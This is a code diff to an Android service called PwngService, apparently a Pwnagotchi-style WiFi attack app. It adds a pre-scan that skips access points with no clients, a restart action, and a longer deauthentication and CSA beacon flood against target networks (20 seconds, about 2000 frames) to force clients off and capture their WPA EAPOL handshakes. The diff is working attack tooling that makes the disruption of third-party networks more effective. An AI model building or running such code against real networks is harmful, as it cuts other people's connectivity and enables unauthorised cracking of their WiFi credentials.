@@ -132,6 +132,16 @@ public class PwngService extends Service {
             }, 2000);
             return START_NOT_STICKY;
         }
+        if (intent != null && "RESTART".equals(intent.getAction())) {
+            // Kill process without .stopped file — START_STICKY auto-restarts fresh
+            new File(STOP_FILE).delete();
+            isRunning = false;
+            stopForeground(true); stopSelf();
+            new Handler(Looper.getMainLooper()).postDelayed(() -> {
+                android.os.Process.killProcess(android.os.Process.myPid());
+            }, 2000);
+            return START_STICKY;  // auto-restart
+        }
         new File(STOP_FILE).delete();
         try {
             startForeground(NOTIFY_ID, buildNotification());
@@ -232,13 +242,27 @@ public class PwngService extends Service {
         cycleCount++;
         if (cycleCount % TARGET_COOLDOWN == 0) recentTargets.clear();
         
+        // Decay no-clients blacklist — expire after NO_CLIENTS_SKIP cycles
+        Iterator<Map.Entry<String, Integer>> blit = noClientsCounter.entrySet().iterator();
+        while (blit.hasNext()) {
+            Map.Entry<String, Integer> e = blit.next();
+            int remaining = e.getValue() - 1;
+            if (remaining <= 0) {
+                noClientsBlacklist.remove(e.getKey());
+                blit.remove();
+            } else {
+                e.setValue(remaining);
+            }
+        }
+        
         // ── Sniff-based attack: beacon_flood deauth → passive EAPOL capture ──
         if ("sniff_deauth".equals(d.action) && d.targetBssid != null 
             && monitorReady && monitor != null && monitor.isEnabled()) {
             success = doSniffDeauth(d);
         }
         
-        brain.reportResult(d.action, success, d.targetBssid, success ? "ok" : "fail");
+        String details = success ? "ok" : lastSniffResult != null ? lastSniffResult : "fail";
+        brain.reportResult(d.action, success, d.targetBssid, details);
         android.util.Log.i("PwngService", "cycle=" + cycleCount + " action=" + d.action 
             + " success=" + success + " phase=" + brain.getPhase() 
             + " hs=" + totalHandshakes);
@@ -246,6 +270,38 @@ public class PwngService extends Service {
     }
 
     // ─── SNIFF DEAUTH: Passive handshake capture (no Evil Twin, no WiFi toggle) ──
+
+    // APs with no clients detected — skip for 10 cycles
+    private Set<String> noClientsBlacklist = new HashSet<>();
+    private Map<String, Integer> noClientsCounter = new HashMap<>();
+    private static final int NO_CLIENTS_SKIP = 10;
+    private String lastSniffResult = null;  // "no_clients", "blacklisted", "fail"
+    
+    /**
+     * Quick pre-scan: check if an AP has any associated clients.
+     * Looks for Data/Null/QoS/ProbeReq frames (not Beacons/ProbeResp).
+     * Returns true if client activity detected within scanDuration seconds.
+     */
+    private boolean hasClients(String bssid, String ssid, int scanDuration) {
+        String raw = monitor.scan(scanDuration);
+        int beaconCount = 0, clientFrames = 0;
+        for (String line : raw.split("\\n")) {
+            // Count beacons for logging
+            if (line.contains("Beacon") && line.contains(bssid)) beaconCount++;
+            // Client frames: Data, Null data, QoS Data, Probe Request, Ack, BlockAck
+            if (line.contains(bssid) && !line.contains("Beacon") && !line.contains("Probe Response")) {
+                if (line.contains("Data") || line.contains("Null") || line.contains("QoS") 
+                    || line.contains("Probe Request") || line.contains("Ack")
+                    || line.contains("BlockAck") || line.contains("RTS") || line.contains("CTS")
+                    || line.contains("Assoc") || line.contains("Reassoc") || line.contains("Auth")) {
+                    clientFrames++;
+                }
+            }
+        }
+        android.util.Log.i("PwngService", "hasClients: " + ssid + " beacons=" + beaconCount
+            + " clientFrames=" + clientFrames);
+        return clientFrames > 0;
+    }
 
     private boolean doSniffDeauth(PwngBrain.Decision d) {
         String bssid = d.targetBssid;
@@ -272,12 +328,39 @@ public class PwngService extends Service {
         // Set monitor to target channel BEFORE deauth
         monitor.setChannel(channel);
         
-        // Phase 1: CSA deauth burst (10s, ~16 calls, ~320 frames total)
+        // Pre-scan: check for client activity before wasting time on empty APs
+        // 5s quick scan — look for Data/Null/QoS/ProbeReq frames
+        if (noClientsBlacklist.contains(bssid)) {
+            brain.currentStatus = "🫗 no clients (blacklisted) " + ssid;
+            currentPhase = "SKIP";
+            lastSniffResult = "blacklisted";
+            android.util.Log.i("PwngService", "Skipping " + ssid + " — no clients (blacklisted)");
+            return false;
+        }
+        
+        brain.currentStatus = "🔍 scanning clients " + ssid;
+        currentPhase = "PRESCAN";
+        updateNotification();
+        if (!hasClients(bssid, ssid, 5)) {
+            brain.currentStatus = "🫗 no clients on " + ssid;
+            currentPhase = "EMPTY";
+            lastSniffResult = "no_clients";
+            noClientsBlacklist.add(bssid);
+            noClientsCounter.put(bssid, NO_CLIENTS_SKIP);
+            android.util.Log.i("PwngService", "No clients on " + ssid + " — blacklisting " + NO_CLIENTS_SKIP + " cycles");
+            updateNotification();
+            return false;
+        }
+        
+        lastSniffResult = null;  // reset — clients found, proceeding
+        
+        // Phase 1: CSA deauth burst (20s, ~100 calls, ~1000 deauth + ~1000 CSA beacons)
+        // (was 10s — too short, client often didn't disconnect)
         brain.currentStatus = "👊 CSA flood " + ssid + " ch" + channel;
         currentPhase = "DEAUTH";
         updateNotification();
         
-        monitor.deauthBurst(bssid, freqMhz, 10);
+        monitor.deauthBurst(bssid, freqMhz, 20);
         
         if (!isRunning) return false;
         
@@ -308,6 +391,7 @@ public class PwngService extends Service {
         
         brain.currentStatus = "😴 no handshake " + ssid;
         currentPhase = "MISS";
+        lastSniffResult = "fail";
         return false;
     }
 
@@ -411,6 +495,8 @@ public class PwngService extends Service {
         PendingIntent p = PendingIntent.getActivity(this, 0, pi, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
         Intent si = new Intent(this, PwngService.class); si.setAction("STOP");
         PendingIntent sp = PendingIntent.getService(this, 0, si, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
+        Intent ri = new Intent(this, PwngService.class); ri.setAction("RESTART");
+        PendingIntent rp = PendingIntent.getService(this, 1, ri, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
         
         String face = brain != null ? brain.currentFace : "(◕‿‿◕)";
         String phase = currentPhase;
@@ -432,6 +518,7 @@ public class PwngService extends Service {
             .setSmallIcon(android.R.drawable.ic_menu_compass)
             .setOngoing(true).setContentIntent(p)
             .setPriority(Notification.PRIORITY_HIGH)
+            .addAction(android.R.drawable.ic_menu_rotate, "Restart", rp)
             .addAction(android.R.drawable.ic_media_pause, "Stop", sp).build();
     }
 
